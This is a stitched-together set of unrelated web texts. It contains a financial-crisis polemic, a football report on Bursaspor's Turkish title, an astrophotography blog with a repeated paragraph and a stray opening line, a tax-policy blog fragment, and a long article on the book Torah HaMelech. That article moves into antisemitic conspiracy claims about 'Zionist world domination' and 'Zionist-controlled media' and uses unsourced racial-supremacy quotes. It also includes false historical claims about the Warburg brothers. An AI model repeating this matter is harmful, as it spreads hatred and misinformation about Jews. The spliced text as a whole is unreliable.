Industry bettors simply concoct counterfeit value by leveraging their own abstract , self - assigned - value assets between themselves in a ping - pong ascending scale beyond the value of the underlying concrete assets .
The bet has both replaced and exceeded the thing it refers to .
There is no there there .
Real money is siphoned in fees from the marks ,  the pension funds who are told they are investing in highly rated , stable instruments , and then the U.S. taxpayer is asked to take up trillions of dollars of real debt in order to cover a counterfeit , undisclosed bidding / betting war .
Should I be able to make a reference to the Bank of England , or food , or oil , simply collect billions of real money if I bet right , and lose my never - there - to - begin - with counterfeit wealth if I dont ?
Who is the house in this casino in which someone can wage a series of bets on assets that actually exceed the value of the assets themselves ?
It s always going to be the American taxpayer , the public , bailing out an unregulated , morally and financially reprehensible private market .
Usually when someone says ,  You really hate America ,  its a disgruntled conservative with a chip on his shoulder .
Well , these profiteers actually make huge sums of money by destroying America , robbing it blind , and then sticking the American citizen with the check for any downside bets .
Now let s see why very little is currently being done to correct this .
One Nasty Hangover : Cultural Capture , Complicity , Rage , and Wondering When the Perps Will Walk
As with any successful mark in a con , the initial reaction by the abused is shame and efforts to pretend a scam did not happen .
With the American people there is also more than a trace of complicity .
People got high on visions of unlimited wealth and got a taste of their skyrocketing wealth , fictional and bubble - driven as it might have been .
Some even used their houses as ATMs .
This stems from a creeping and cleverly warped version of the American Dream , that we all could get wealthy without working if we were lucky or clever enough .
In the orgy to get in on a good thing ,  people didnt ask the serious question about whether this collusion was a morally , socially , and spiritually bad way to live your life , not to mention an abominable way to treat others and future generations .
Turns out the good thing is bad for everyone involved , even the crooks .
People will begin to wake up to this as more jobs get lost and the fig leaves of fanfare - driven recovery fade into an uncomfortable reality the United States and the world has been ripped off trillions of dollars , more than can be paid back even on the backs of overworking two - income families .
Rage is beginning to replace shame as the promises of recovery keeping meeting the stubborn reality of high unemployment , frozen lending , plunging commercial and residential real estate , skyrocketing college tuition , and expensive oil .
People are beginning to wonder ,  Where are the prosecutions ; where is the accountability ? 
Why are citizens being counseled to liquidate their retirements to pay for their upside - down mortgages while corporations walk away from billion dollar real estate busts ?
Why is public money being used to bail out banks that engaged in purely private , unregulated betting ?
Part of the answer is revealed in the case of Bradley Birkenfeld .
Birkenfeld was an inside - the - inner - circle employee of the UBS , a Swiss Bank and one of the largest banks in the world .
Swiss banks pride themselves on their discretion and privacy , a policy that allowed them to hide stolen Nazi wealth for decades .
So it s clear that we are only talking financial and not moral discretion . 
In fact , Swiss banks continue to be a haven for tax cheats , international arms dealers , and anyone looking to park their ill - gotten gains outside the prying eyes of international law .
After counseling clients including American politicians how to divert their money into UBS to avoid taxes , and even acting as a concierge to buy expensive objects for clients , Birkenfeld finally blew the whistle on the operation .
In interviews on CBSs 60 minutes and Amy Goodmans Democracy Now , Birkenfeld and his lawyer outlined the depth the corruption .
From the April 15th , 2010 Democracy Now interview with Stephen Kohn , Birkenfelds lawyer : Nineteen thousand American millionaires and billionaires had these offshore accounts .
You had to be very wealthy to set one of these up .
The government created an amnesty program , so if you voluntarily turned yourself in , you escaped any prosecution and even public exposure .
No one would even know who you were .
On the other hand , to Mr. Birkenfeld , who didnt even have an account , Mr. Birkenfeld , who turned it in , he was sentenced to prison and was not offered immunity .
So that s the dichotomy .
Dichotomy indeed .
There existed in UBS tens of billions of dollars of hidden , tax - dodges for the American clients alone , and all those clients got was a slap on the wrist and more discretion around their identities from U.S. law enforcement ?
UBS itself was merely fined 780 million dollars and forced to give over its names , a drop in the bucket for their almost 2 trillion dollar holdings .
For all those wanting a progressive resurgence of the level playing field and the rule of law , there is little evidence of accountability to nourish ones desire for justice .
Hopes for real top - down prosecution are fading , but is there another tack the public can take ?
Conclusion : A Possible Silver Lining
How can a world - wide economy unhinged from concrete reality perhaps result in positive changes ( after , no doubt , a lot of pain ) ?
The answer is fairly brief .
Part of the problem involves mooring our own notions of the good life to our material subsistence and / or success .
The notion that living luxuriously equals the epitome of the good life , has stunted our development and kept us infantilized , even with the many technological , artistic , social , and cultural advances we have made .
We still spend a vast majority of our time grinding out a living in so - so jobs that do not challenge us intellectually or creatively and that displace quality energy and time we could be spending with family , friends , community , and world .
We can make things , even necessities , cheaper than we ever have , yet we are spending more time working .
In the 1990s and 2000s , productivity skyrocketed in the U.S. , but real wages remained flat or declined .
Now we see why .
We have become debts serfs to financializers and market manipulators , who dont even bother having a material stake in the game .
We can see two things from this if we are prepared to mature :
1 ) The good life , and even the economy itself , do not have to be primarily tied to material existence , and 2 ) We can do most if not all the things for ourselves that experts  are being paid to do .
We can decide to rent or share housing and watch each others kids .
We can decide to drastically reduce our consumption , thus saving the environment and de-polluting our daily life .
We can move our money to community banks , directly invest into microfinance , or lend to each other through circle lending ,  cutting out the big banks and brokerages .
We can help each other fortify and maintain our health through community programs and medical tourism , cutting out health insurance and medical industry parasites .
We can set up or join intellectually and socially edifying cultural groups .
In short we can exercise civil disobedience , refuse to be stooges , create our own spaces , and and recommit to spend time and energy where our true heart lies , free from the delusional temptations of a corporate - driven reason for life that has shown itself to be both conclusively abusive and unfulfilling .
In the end , they need us , and we dont need them .
This is the only  this life  we are going to have .
It s a lot more adventurous and enhancing to be a cultural creative then a debt slave .
So , what are we waiting for ?

When Michel Platini summoned the spirit of Robin Hood to redesign the Champions League by giving a helping hand to Europe 's disenfranchised , his philosophy was plain to see .
Promoting the cause of the footballing serfs at the expense of the richest aristocrats is no easy task .
So it will please him no end to see some clubs taking it into their own hands to depose the usual suspects .
Following in the footsteps of such sides as Rubin Kazan ( Russia ) and CFR Cluj ( Romania ) , there are a couple of Champions League newcomers who have already banked their golden ticket for the group stage .
Ongoing English interest in the career of Steve McClaren means we know all about FC Twente 's progress at the expense of the Dutch establishment .
Last week that feat was emulated by unfashionable Bursaspor , who will be the first Turkish club from outside Istanbul to play in the Champions League having claimed their first ever title .
The night they clinched that honour , there were crazy scenes in two Turkish cities .
Bursaspor , who had never even finished in the top three before , had led the Superlig for quite a while only to fritter away their advantage .
They went into the final round of the season a point behind Fenerbahce , whose glittering history has the imprint of 17 Super Lig titles .
The odds were stacked against Bursaspor .
Spectacularly , they managed to do the business in their last match while Fenerbahce could only squeak to a draw .
So much for the odds .
The twist in the tale saw delirious celebrations in Bursa and Istanbul simultaneously , because some bright spark with a microphone at Fenerbahce 's Sukru Saracoglu stadium announced ( wrongly ) that Bursaspor had faltered and they were champions .
Such cock - ups do not get accepted in Turkey with the kind of stoicism observed at Manchester City in 1996 , when they famously welcomed the " news " that they had escaped relegation by easing off for the last 12 minutes of a crucial game , a scene that turned tearful and melancholy when corrected scores from elsewhere condemned them .
Miserable contemplation not really being the thing at Fenerbahce , their fans instead stormed on to the pitch , set fire to their seats , clashed with police and went on the rampage in the streets outside .
Bursaspor were presented with their trophy the following night .
Almost 30,000 fans ( 10,000 more than the stadium 's capacity ) were there to see it and they were understandably overjoyed .
With a budget of only € 9 m ( £ 7.7 m ) – a fraction of the amount spent by the big three of Galatasaray , Fenerbahce and Besiktas – they conquered all .
Their coach , Ertugrul Saglam , was always bullish about their chances .
He called upon his players to " play with sacrifice " and they did everything required .
In the run -in they faced two of the big three , drawing at Galatasaray before finishing off with a home win over Besiktas .
They lost only one match in the Superlig since the winter break and were top scorers .
" I condemn all the people who say our rise is just coincidence , " the former Besiktas coach said .
" It 's disrespectful to our efforts and the players , who have perfect character .
Although they are not as high profile as our opponents , my players are very determined .
That 's what makes the difference between us and them .
After taking pole position in the league during the course of the season , we believed in our hearts that we could win the title . "
It is still an unlikely story .
Bursaspor are only the second team from outside the Istanbul to win the Superlig .
The last time it happened was 26 years ago , when Trabzonspor won the last of their six titles .
Bursa is the fourth biggest city in Turkey , a two - hour boat journey from Istanbul , and the team have traditional working - class roots .
Saglam built a team by polishing a couple of Turkish gems ( four of their players have just been called up to join Guus Hiddink 's squad ) and inspiring signings who were mainly rejects from other clubs .
Among them is the Bulgarian keeper Dimitar Ivankov , who is a renowned penalty taker and one of the most prolific keepers in football history – he has more than 40 goals to his name .
The Serbian Ivan Ergic was once signed by Juventus but never played for them and later went on to suffer depression .
The Argentinian Pablo Batalla had done the rounds in South America and was signed from the Colombian league .
All joined together for the good of Bursaspor .
They are known as the Green Crocodiles , and should they score any goals in the Champions League next year we will witness their reptilian goalscoring celebration , which sees the players line up and slither on their hands and knees in imitation of a crocodile 's movement .
Exciting times ahead .
Even if they have just been linked with a move for Marlon Harewood on a free transfer .

Some Other Neat Stuff :
Yitzhak Shapira , the fanatical Zionist rabbi , who heads the Old Yosef Chai Yeshiva in the illegal settlement of Yitzhar , near Nablus and rabbi Yossi Elitzur have penned a new book : Torah HaMelech ( The King 's Torah ) that has become the subject of the news in Eretz Yisrael ( Hebrew for Land of Israel ) ( 1 ) .
According to Roee Sharon , the book contains no less than " 230 pages on the laws concerning the killing of non-Jews , a kind of guide for anyone who ponders the question of if and when it is permissible to take the life of a non-Jew " ( see the original Hebrew article by Roee Sharon in Maariv , November 9 , 2009 ( 2 ) .
A translation of the Maariv article can be read at Coteret News ) ( 3 ) .
The book follows the halachic laws ( the collective body of Jewish religious law , including the 613 biblical laws ) for the killing of the goyim ( Hebrew for nations ) , who threaten Eretz Yisrael ( 4 ) .
" Jews have the right to kill non-Jews in just about any circumstance . "
" If we kill a gentile who has sinned or has violated one of the seven commandments … there is nothing wrong with the murder " ( 5 ) .
The permission to kill is given on the basis of the Sheva mitzvot B'nei Noach ( the seven Noachian Laws ) , which , according to the Talmud , should be followed by all mankind ( 6 ) ; ( see The Noachian Laws in Jewish Encyclopedia ( 7 ) .
" When we approach a non -Jew who has violated the seven Noachian laws and kill him out of concern for upholding these seven laws , no prohibition has been violated " ( 8 ) .
The Yeshiva World News official website justifies the book 's permission to kill with the following statement : " The sefer [ Hebrew for book ] adds that killing a non-Jew who has violated the Seven Mitzvos [ Hebrew for commandments ] given to non-Jews because we care about torah and mitzvos , then this is acceptable .
It stresses the importance of Eretz Yisrael , the halachic requirements of the land , and living within a torah framework " ( 9 ) .
Similarly , the book justifies the killing of " non-Jews who demand the land for themselves " ( 10 ) .
Civilians are not immune from Shapira 's and Elitzur 's attacks : " Any case in which the life of the civilian endangers Israel – it is allowed to kill a gentile . "
This authorization applies to direct and indirect " endangering " of Israel .
Thus civilians who aid fighters , support the war , or sympathise with the resistance should be killed ( 11 ) .
The Rabbis also encourage the killing of non-Jews that bear Israeli citizenship but are suspected of assisting organizations that are considered a " threat to national security " by the present regime ( 12 ) .
According to Shapira and Elitzur babies and children can be killed too because they are " hindrances . "
" Hindrances – babies are found many times in this situation .
They block the way to rescue by their presence and do so completely by force .
Nevertheless , they may be killed because their presence aids murder .
There is justification for killing babies if it is clear that they will grow up to harm us , and in such a situation they may be harmed deliberately , and not only during combat with adults . "
" The children of the leader may be harmed in order to apply pressure to him .
If attacking the children of a wicked ruler will influence him not to behave wickedly , they may be harmed " ( 13 ) .
The conclusion of the book contains the following statement : " In religious law , we have found that non-Jews are generally suspected of shedding Jewish blood , and in war , this suspicion becomes a great deal stronger .
One must consider killing even babies , who have not violated the seven Noachian laws , because of the future danger that will be caused if they are allowed to grow up to be as wicked as their parents " ( 14 ) .
Encouraging retaliation , Rabbis Shapira and Elitzur support violence and give credence to the notion that " In order to defeat the enemy … [ they ] must behave toward … [ the enemy ] in a spirit of retaliation and measure for measure . "
" Retaliation is absolutely necessary in order to render such wickedness not worthwhile .
Therefore , sometimes we do cruel deeds in order to create the proper balance of terror " ( 15 ) .
The idea of using terror fits with Israel Koenig 's recommendation in " The Koenig Memorandum " – " We must use terror , assassination , intimidation , land confiscation , and the cutting of all social services to rid the Galilee of its Arab population " ( 16 ) .
It also fits with Rafael Eitan 's prescription for the removal of Palestinians from Palestine : " We declare openly that the Arabs have no right to settle on even one centimetre of Eretz Israel [ the land of Israel ] …
Force is all they do or ever will understand .
We shall use the ultimate force until the Palestinians come crawling to us on all fours " ( 17 ) .
A similar sentiment was expressed by the co-signer of the document called The Declaration of the Establishment of the State of Israel ( 18 ) and future Prime Minister of Israel David Ben Gurion : " We must expel Arabs and take their places " ( 19 ) .
Yoram Bar Porath supported these views : " It is the duty of Israeli leaders to explain to public opinion , clearly and courageously a certain number of facts that are forgotten with time .
The first of these is that there is no Zionism , colonisation or Jewish State without the eviction of the Arabs and the expropriation of their lands " ( 20 ) .
Vladimir Jabotinsky , the founder of Revisionist Zionism , had expressed similar views long before the establishment of the State of Israel : " If you wish to colonize a land in which people are already living , you must provide a garrison for the land … or else , give up your colonization , for without an armed force which will render physically impossible any attempt to destroy or prevent this colonization , colonization is impossible , not difficult , not dangerous , but IMPOSSIBLE ! …
Zionism is a colonization adventure and therefore it stands or falls by the question of armed force [s ] " ( 21 ) .
The statements by Israel Koenig , Rafael Eitan , David Ben Gurion , Yoram Bar Porath and Vladimir Jabotinsky bear all the trappings of a jihad against the Palestinians .
Commonly translated as Holy War , the Arabic word literally means " striving , " " struggling , " " endeavouring " ( 22 ) .
Webster 's Encyclopaedic Unabridged Dictionary of the English Language defines it as 1 ) " a holy war undertaken as a sacred duty by Muslims " and 2 ) " any vigorous , often bitter crusade for an idea or principle " ( 23 ) .
The online version of the same dictionary identifies it as a noun , provides a variant ( Jehad ) , the etymology ( Arabic jih?d ) but maintains the same definitions ( 24 ) .
T. P. Hughes explains that there are two kinds of jihads – " the greater " against one 's own lusts and " the lesser " against infidels ( 25 ) .
According to Hughes , the description of the " lesser jihad " occurs in al - Madinah Surahs ( an Islamic term denoting a chapter in the Qur'an ) , written after Muhammad established his supreme rule and was able to dictate his terms and conditions to his enemies ( 26 ) .
Historically , this type of jihad can be viewed as a way of advancing Islam among the conquered unbelievers offering them three choices ( 1 ) " the reception of Islam , in which case the conquered became enfranchised citizens of the Muslim state ; ( 2 ) " the payment of a poll - tax ( Jizyah ) , by which unbelievers in Islam obtain protection , and become Zimmis … " and ( 3 ) " death by sword , to those who will not pay the poll - tax " ( 27 ) .
Unlike its Islamic counterpart , the Zionist jihad does not differentiate between " greater " and " lesser " types and terror is not used as a last resort , as was the case with the last option in the al - Madinah Surahs of the Qur'an .
Terror is part and parcel of all Zionist undertakings .
The notion not only justifies the senseless killing of civilians , including women , children and the elderly , but also promotes it .
Israel 's former chief rabbi , Mordechai Elyahu encouraged the Israeli army to mass murder Palestinians in 2007 : " If they do n't stop after we kill 100 , then we must kill 1,000 .
And if they do n't stop after 1,000 , then we must kill 10,000 .
If they still do n't stop we must kill 100,000 .
Even a million . "
A similar feeling is expressed in June 2009 , by US Hasidic Rabbi Manis Friedman , who encouraged Israelis to kill Palestinian " men , women and children . "
" I do n't believe in Western morality , i.e. , do n't kill civilians or children , do n't destroy holy sites , do n't fight during the holiday seasons , do n't bomb cemeteries , and do n't shoot until they shoot first because it is immoral .
The only way to fight a moral war is the Jewish way : destroy their holy sites .
Kill men , women and children ( and cattle ) " ( 28 ) .
According to Maariv , Shapira 's and Elitzur 's Torah HaMelech does not mention Palestinians or Arabs ; the " killing of gentiles " is a " theoretical concept , " supposedly unrelated to the politics of the region – " he [ Shapira ] was ' careful not to explicitly encourage private individuals to take the law into their own hands " ( 29 ) .
The Yeshiva World News official website stresses the fact that while " the media is having a field day with the sefer , it is written that the sefer discusses theoretic halachic principles , and in no way calls for the murder of goyim , ' Arabs ' or ' Palestinians ' as the media seeks to imply " ( 30 ) .
This may be so , but Torah HaMelech , the new halachic guide for the Zionist jihad is popular among several prominent rabbis , who recommended it to their followers and students .
The Yeshiva World News official website enlists approbation from Rabbi Dov Lior , Rabbi Yaakov Yosef , and Rabbi Yitzchak Ginsburgh ( 31 ) .
In 2003 , under pressure from left - wing groups , Attorney - General Elyakim Rubinstein charged Rabbi Yitzchak Ginzburgh , the former head of the Old Yosef Chai Yeshiva in Shechem , with incitement to racism .
Rabbi Ginsburgh 's June 19 , 1989 statement clearly declares : " Jewish blood and a goy's ( gentile 's ) blood are not the same . "
Thus , killing is n't murder if the victim is Gentile . ( 32 ) .
According to Rabbi Ginsburgh " … every single cell in a Jewish body entails divinity , and is thus part of God . "
If this is so , " then every strand of DNA is a part of God .
Therefore , something is special about Jewish DNA . "
Using similar logic , Rabbi Ginsburg declared that " the Arabs … do n't have the right to live in … [ Israel ] and that " they want to take land that does n't belong to them and therefore they are also robbers . "
" The concept of the third world , which is the most primitive on the scale of nations , refers to the Arabs who are on the lowest rung in the scale …
According to Kabbalah , the Jewish people are the most advanced people in mind and spirit , but Yishmael is a nation of slaves and the character of a slave is licentious and undisciplined " ( 33 ) .
Approbation from a brilliant " haematologist " and " DNA specialist " Rabbi Ginsburgh speaks volumes , especially when considering the fact that Ginsburgh 's own sentiments concerning the killing of non-Jews do not differ from those of Shapira and Elitzur – Ginsburgh justified the US - born Baruch Goldstein 's 1994 killing of the Palestinian worshippers in the Machpela Cave mosque in Hebron during Ramadan on halachic grounds ( 34 ) .
Another religious leader , Rabbi Dov Lior , the chairman of the Yesha rabbinical council , chief rabbi of Kiryat Arba ( 35 ) that has endorsed Shapira 's and Elitzur 's new halachic guide for the Zionist jihad is an " expert " on military matters : " There is no such thing as enemy civilians in war time .
The law of our Torah is to have mercy on our soldiers and to save them … A thousand non-Jewish lives are not worth a Jew's fingernail " ( 36 ) .
A student of Rabbi Tzvi Yehuda Kook , the founder of the extremist Gush Emunim with the slogan " The Land of Israel , for the people of Israel , according to the Torah of Israel , " Rabbi Dov Lior continues to sponsor the teachings of his mentor Rabbi Tzvi Yehuda Kook and the latter 's father , fundamentalist Rabbi Abraham Kook , the founder of the first Zionist Yeshiva in Jerusalem in 1924 , during the British Mandate , who said : " The difference between a Jewish soul and souls of non-Jews – all of them in all different levels – is greater and deeper than the difference between a human soul and the souls of cattle " ( 37 ) .
In late 1980s , following a public protest over his suggestions to use captured Arab terrorists " to conduct medical experiments , " Rabbi Lior was barred from the election to the Supreme Rabbinical Council ( 38 ) .
More recently , Rabbi Dov Lior issued a halachic decree , which states that " it is forbidden by Jewish law to employ Arabs or rent homes to them " ( 39 ) .
In an interview published by " Eretz Israel Shelanu " ( Our Land of Israel ) , Rabbi Lior said : " since this is a matter of endangering souls , it is clear that it is completely forbidden to employ them and rent houses to them in Israel .
Their employment is forbidden not only at yeshivas , but at factories , hotels and everywhere " ( 40 ) .
Rabbi Yaakov
Yosef , the head of the Hazon Yaakov Yeshiva in Jerusalem and the son of Shas ' spiritual leader Rabbi Ovadia Yosef ( 41 ) is another supporter of Yitzhak Shapira 's and Yossi Elitzur 's new halachic guide for the Zionist jihad .
He is a member of the national - religious community and has served as a Shas MK in the past ( 42 ) .
The fact that Shapira and Elitzur began selling Torah HaMelech at the memorial for Rabbi Meir Kahane , the Israeli Knesset member who advocated " mass expulsion of Palestinians from Israel and the territories " ( 43 ) is significant .
It implies that even though it is not distributed by the leading book - sellers ( 44 ) , Shapira 's and Elitzur 's sefer is known among past and present members of the Israeli Knesset , suggesting that the halachic guide for the Zionist jihad is tacitly promoted at the highest level of the government .
The statement that Rabbi Shapira 's and Rabbi Elitzur 's halachic guide for the Zionist jihad does not target Palestinians or Arabs and approaches the " killing of gentiles " from a " theoretical " perspective is more worrisome than one might suspect .
It can be interpreted as a license to kill all gentiles that fit into the authors ' category of the " goyim who threaten Eretz Yisrael . "
But the category can be broadened to include all who oppose Israel 's Zionist agenda in the occupied territories , conveniently branded as anti-Semites by the Zionist - controlled media ( see What is Anti-Semitism ? by the same author ( 45 ) .
And finally , the category can be broadened to include all opposition to the Zionist programme of world domination : " We will have a world government whether you like it or not .
The only question is whether that government will be achieved by conquest or consent . "
( Jewish Banker Paul Warburg 's testimony before the U.S. Senate , February 17 , 1950 ( 46 ) ; Paul Warburg , the founder of the US Federal Reserve , was the brother of Max Warburg , the chief of German Intelligence and an associate of Adolf Hitler – both were executives of I.G. Farben ) .
Whether these categories were delineated or not is secondary to the fact that Shapira 's and Elitzur 's sefer was sold at Mercaz Harav Yeshiva , the flagship of Orthodox Zionism .
According to Mathew Wagner of The Jerusalem Post , there was a small sign at the entrance advertising the sale of Torah HaMelech at NIS 30 and " those interested in buying the book were asked to place money in a small cup and take … [ a copy ] " ( 47 ) .
A young man called Lior , whose name and phone number had appeared on the advertisement , was surprised to realize how fast the copies were sold .
The authors and promoters of the halachic guide for the Zionist jihad could not have chosen a better location for the sale – Torah HaMelech is especially useful for the students of the yeshiva " who have served , are presently serving or plan on serving in the IDF " ( 48 ) .
Mathew Wagner further explains that since " a large portion of Torat Hamelech is dedicated to exploring Jewish " rules of engagement " according to the authors ' interpretation of Jewish law , " the book is relevant " for many young men at Mercaz Harav or other Orthodox Zionist yeshivot where IDF service is combined with intense Torah learning " ( 49 ) .
The fact that " the book could have practical implications for how religious soldiers do battle " ( 50 ) is of no consequence to Rabbi Zalman Nechemia Goldberg , who is " a highly respected halachic authority in both haredi and religious Zionist circles " – his endorsement appeared in the book .
As Rabbi Shapira 's and Rabbi Elitzur 's halachic guide will undeniably incite more violence against non-Jews , it will also contribute to the rift between Jews and Gentiles .
The Zionist intellectual Maurice Samuel , in his You Gentiles of 1924 polarized the gentile and the Jewish worlds : " There are two life - forces in the world I know : Jewish and gentile , ours and yours … Your outlook on life , your dominant reactions , are the same to - day as they were two thousand years ago .
All that has changed is the instrument of expression .
You live the same life under different faiths , but something clings to you here and there resembling the original form of the faith we gave you " ( 51 ) .
Samuel admits that the " surface credo of a Jewish faith " imposed on a gentile way of life did not make a fundamental difference : " But in the end your true nature works itself into the pattern of the borrowed faith , and expresses itself undeniably " ( 52 ) .
Samuel suggests that there is a " clear and fateful division of life – Jewish and gentile , " with an " unsounded abyss between " them .
Gentiles have a " way of living and thinking " that is distinctly different from Jews : " I do not believe that this primal difference between gentile and Jew is reconcilable .
You and we may come to an understanding , never to a reconciliation .
There will be irritation between us as long as we are in intimate contact .
For nature and constitution and vision divide us from all of you forever … " ( 53 ) .
Similar to other Zionists , Samuel 's " solution " is based on the destruction of the existing world order : " A century of partial tolerance gave us Jews access to your world .
In that period the great attempt was made , by advance guards of reconciliation , to bring our two worlds together .
It was a century of failure . …
We Jews , we , the destroyers , will remain the destroyers forever .
Nothing that you will do will meet our needs and demands .
We will forever destroy because we need a world of our own , a God- world , which it is not in your nature to build " ( 54 ) .
The separation between Jews and non-Jews lies at the heart of the teachings of Zionist intellectuals and religious leaders .
This teaching is encouraged even outside of Israel .
Elliot Abrams , a neo-conservative in charge of President Bush 's " global democracy strategy , " wrote in 1997 that " [ Jewish law ] does indeed separate Jews from their fellow citizens " and that " Jews are in a permanent covenant with God and with the land of Israel and its people " ( 55 ) .
The sentiment of irreconcilable differences is enforced in the following statement , this time with overt shades of racial superiority : " We Jews regard our race as superior to all humanity , and look forward not to its ultimate union with other races , but to its triumph over them . "
Rabbi Saadya Grama 's 2003 book Romemut Yisrael Ufarashat Hagalut ( The Majesty of Israel and the Question of the Diaspora ) provides a race - based theory of Jewish supremacy arguing that non-Jews are " completely evil , " while Jews are genetically superior : " The difference between the people of Israel and the nations of the world is an essential one .
The Jew by his source and in his very essence is entirely good .
The goy , by his source and in his very essence is completely evil .
This is not simply a matter of religious distinction , but rather of two completely different species " ( 56 ) .
This attitude towards the goyim is reinforced by the statement of Golda Maier on March 8 , 1969 .
Her declaration : " How can we return the occupied territories ?
There is nobody to return them to " ( 57 ) is a clever pun suggesting that the original inhabitants of Palestine are " nobody " i.e. , not people .
Apart from its inherent falsehood ( see the statements by Israel Koenig , Rafael Eitan , David Ben Gurion , Yoram Bar Porath , Vladimir Jabotinsky above ) , Golda Maier 's derogatory remark downplays the danger posed to Israel by the original inhabitants : a " nobody " surely does not threaten the security of Eretz Yisrael .
If there is no real danger to threaten Eretz Yisrael , then Rabbi Shapira 's and Rabbi Elitzur 's halachic guide for the killing of the goyim is founded on the principle of HATRED – a sentiment shared by Israel Koenig , Rafael Eitan , David Ben Gurion , Yoram Bar Porath , Vladimir Jabotinsky , Maurice Samuel , Paul Warburg , Rabbi Abraham Kook , Rabbi Tzvi Yehuda Kook , Rabbi Meir Kahane , Rabbi Saadya Grama , Rabbi Yitzchak Ginsburgh , Rabbi Dov Lior , Rabbi Yaakov Yosef , Rabbi Mordechai Elyahu , Rabbi Manis Friedman , Rabbi Zalman Nechemia Goldberg , whose statements demonstrate similar hatred for the goyim .
According to Roee Sharon , Shapira 's and Elitzur 's halachic guide for the Zionist jihad
includes " hundreds of sources from the Bible and religious law " ( 58 ) .
Indeed , the Bible demands separation , segregation and discrimination .
After restating his " abhorrence " ( Lev 20:23 ) towards the previous inhabitants of the land and his reasons for driving them out , God promises their land " flowing with milk and honey " – a clear reference to Exodus 33:3 – to his people declaring : " I am the Lord your God ; I have separated you from the peoples " ( Lev 20:24 ) .
Ezra marks this separation with his famous term " the holy seed " ( Ezra 9:2 ) , " zera hakodesh " in Hebrew ( 59 ) , which compels the entire community to dissolve all inter-marriages , getting rid of foreign wives and their children ( Ezra 10:3 ) .
The ideology of separation , segregation and discrimination combined with the toxic rhetoric of the fundamentalists yields a dangerous brew made up of insanity and criminality .
Mathew Wagner discusses the critical response of a " leading religious Zionist media figure " ( 60 ) .
One may take a sigh of relief in thinking that the criticism is based on a sound evaluation of the dangers associated with endorsing radical jihadist ideology .
Alas , this is not the case – the anonymous " leading religious Zionist media figure " is NOT concerned with the moral imperative of such indoctrination , in fact he agrees with the conclusions of Shapira 's and Elitzur 's halachic guide : " I do not doubt the halachic conclusions of the book " ( 61 ) .
He is concerned with the negative publicity the book generated : " I grabbed my head when I saw the headline in Ma'ariv … I said to myself we have just managed to contain the media damage done to us by Teitel , by showing he is an isolated element , and now this happens " ( 62 ) .
Thus , while the civilized world is screaming about Shapira 's and Elitzur 's sefer Torah HaMelech , the reaction towards the new Halachic Guide is positive in Israel .
No one seems to worry about the fact that it will definitely lead to more violence .
The " leading religious Zionist media figure " epitomizes the Zionist mentality : the life of the goyim is less important than the media damage caused by the publication of Shapira 's and Elitzur 's halachic guide for the Zionist jihad .

He said : " I have been doing it for more than 20 years now and have got a nice collection of vehicles which I store in my basement , but I am starting to run out of room .
Meanwhile the Earth is spinning on its axis .
Like the rotating restaurant on the top of a cheesy hotel we are constantly pointing in a different direction .
That creates a photographic problem and opens a photographic opportunity !
A few nights ago I pulled “ Clicky ” out and shot the night sky .
My intention was to produce a time lapse as the stars rotated by ( at the bottom of this entry ) .
As I showed the video one thing became obvious .
Many of those who saw it did n’t realize they ’d see that effect from a camera in a fixed position .
We ’ve become out - of - touch with the nighttime sky which no longer is as visible nor has the importance it did to our great grandparents .
Stars are very , very far from us .
The closest star ( other than our own Sun ) is Proxima Centauri which is about 25,260,733,353,600 miles away ( that ’s 25 + trillion miles ) !
Others in the visible sky are thousands or even millions of times more distant .
That keeps our view of stars reasonably constant .
Meanwhile the Earth is spinning on its axis .
Like the rotating restaurant on the top of a cheesy hotel we are constantly pointing in a different direction .
That creates a photographic problem and opens a photographic opportunity !
The opportunity is time lapse .
What my little movie shows is n’t stars moving , but the effect of the Earth rotating¹ .
Aiming at any single point in the sky reveals stars passing by .
They ’ll return to about the same point 24 hours later .
The photographic problem is the same one faced any time you try to photograph something in motion : blur !
Because stars are dim the only way to photograph them is to keep the shutter open a long time and allow more photons to hit the camera ’s sensor .
The longer the shutter is open the farther those stars move .
The result is streaks across the sky , not points of starry light .
Sophisticated astronomers ( aka – not me ) solve this problem with clock drives .
Their telescopes and cameras move in exactly the opposite direction as the Earth .
The effect is to hold the stars still .
There are simple mechanical devices that do exactly the same thing .
I ’ve got a little wooden wedge with a hand turned screw which allows my camera to take long star exposures with impunity .
Nowadays the easiest way to eliminate the blur is with a software assist .
When I shot my time lapse I took over 400 images one - after - the - other .
Each was a single second ’s look at the sky .
Using a program called DeepSkyStacker I combined those images and restacked them eliminating the effect of Earth ’s rotation .
As a bonus DeepSkyStacker looks at specially shot blank frames to understand my specific camera ’s weaknesses and counteract them !
The resulting photo is the equivalent of an eight minute plus exposure –though digitally made superior .
I ’ve taken a small piece of it an placed it at full resolution at the top of this entry .
Just below it is the full frame ( though not at full resolution ) .
These shots , compilations of over 400 separate photos , show stars I could n’t see with my naked eye .
It ’s all very heady stuff and amazing to me .
It ’s not just that these techniques are available , it ’s that they ’re available to anyone for free and easily used with cameras a lot less sophisticated than mine .

Impending Economic Catastrophe Watch
Doug Mataconis · · 18 comments
To brighten up your Tuesday morning , here ’s a trio of forecasts that may cause you to start stuffing cash in the mattress .
First , Arthur Laffer writes in The Wall Street Journal about the economic impact of the impending repeal of the Bush tax cuts :
On or about Jan. 1 , 2011 , federal , state and local tax rates are scheduled to rise quite sharply .
President George W. Bush ’s tax cuts expire on that date , meaning that the highest federal personal income tax rate will go 39.6 % from 35 % , the highest federal dividend tax rate pops up to 39.6 % from 15 % , the capital gains tax rate to 20 % from 15 % , and the estate tax rate to 55 % from zero .
Lots and lots of other changes will also occur as a result of the sunset provision in the Bush tax cuts .
Tax rates have been and will be raised on income earned from off - shore investments .
Payroll taxes are already scheduled to rise in 2013 and the Alternative Minimum Tax ( AMT ) will be digging deeper and deeper into middle - income taxpayers .
And there ’s always the celebrated tax increase on Cadillac health care plans .
State and local tax rates are also going up in 2011 as they did in 2010 .
Tax rate increases next year are everywhere .
Now , if people know tax rates will be higher next year than they are this year , what will those people do this year ?
They will shift production and income out of next year into this year to the extent possible .
As a result , income this year has already been inflated above where it otherwise should be and next year , 2011 , income will be lower than it otherwise should be .
Also , the prospect of rising prices , higher interest rates and more regulations next year will further entice demand and supply to be shifted from 2011 into 2010 .
In my view , this shift of income and demand is a major reason that the economy in 2010 has appeared as strong as it has .
When we pass the tax boundary of Jan. 1 , 2011 , my best guess is that the train goes off the tracks and we get our worst nightmare of a severe “ double dip ” recession .
Laffer ’s analysis seems spot-on .
